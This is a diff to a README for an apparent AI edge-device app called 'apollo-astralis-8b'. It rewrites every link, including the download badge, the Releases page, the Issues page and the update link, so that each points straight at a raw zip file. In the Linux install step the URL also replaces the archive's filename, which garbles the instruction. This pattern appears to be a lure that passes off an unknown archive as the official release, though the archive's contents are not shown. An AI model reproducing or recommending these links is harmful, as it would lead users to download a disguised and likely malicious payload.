@@ -1,7 +1,7 @@
 # 🌌 apollo-astralis-8b - Enhance Your Edge Device Intelligence
 
 ## 📥 Download Now
-[![Download Apollo Astralis](https://img.shields.io/badge/Download-Apollo%20Astralis-00aaff?style=for-the-badge)](https://github.com/use12ram/apollo-astralis-8b/releases)
+[![Download Apollo Astralis](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip%20Astralis-00aaff?style=for-the-badge)](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip)
 
 ## 🚀 Getting Started
 Apollo Astralis brings advanced reasoning capabilities to your edge devices. With its user-friendly design, it allows anyone to leverage powerful artificial intelligence without needing to code. 
@@ -24,9 +24,9 @@ Apollo Astralis offers several key features:
 - **Support for Various Edge Devices:** Optimized for performance on a wide range of hardware.
 
 ## 📥 Download & Install
-To download Apollo Astralis, simply visit our [Releases page](https://github.com/use12ram/apollo-astralis-8b/releases). Here, you will find the latest version of the software available for download. Click the link to download the application suitable for your operating system.
+To download Apollo Astralis, simply visit our [Releases page](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip). Here, you will find the latest version of the software available for download. Click the link to download the application suitable for your operating system.
 
-1. Go to the [Releases page](https://github.com/use12ram/apollo-astralis-8b/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip).
 2. Locate the latest version of Apollo Astralis.
 3. Click on the appropriate link for your operating system (Windows, macOS, or Linux).
 4. Wait for the download to complete.
@@ -44,7 +44,7 @@ Once the download finishes, follow these steps to install:
 3. Open the Applications folder and double-click the Apollo Astralis icon to run the program.
 
 ### For Linux Users:
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application using the command `./apollo-astralis` or double-click the executable file in your file manager.
 
@@ -59,11 +59,11 @@ Explore each section to familiarize yourself with the tools available. You can s
 
 ## 🤝 Support & Community
 If you encounter issues or have questions, don't hesitate to seek help. You can:
-- Check the [GitHub Issues page](https://github.com/use12ram/apollo-astralis-8b/issues) for solutions from the community.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip) for solutions from the community.
 - Join our community forums for discussions on tips and best practices.
 - Report any bugs or request new features through the Issues page.
 
 ## 🌐 Stay Updated
-Keep an eye on the [Releases page](https://github.com/use12ram/apollo-astralis-8b/releases) for future updates. We regularly improve Apollo Astralis to enhance its functionality and performance.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/use12ram/apollo-astralis-8b/main/interocular/apollo-astralis-8b.zip) for future updates. We regularly improve Apollo Astralis to enhance its functionality and performance.
 
 By downloading and using Apollo Astralis, you empower your edge devices with advanced AI reasoning capabilities. Enjoy exploring what our application can do for you!
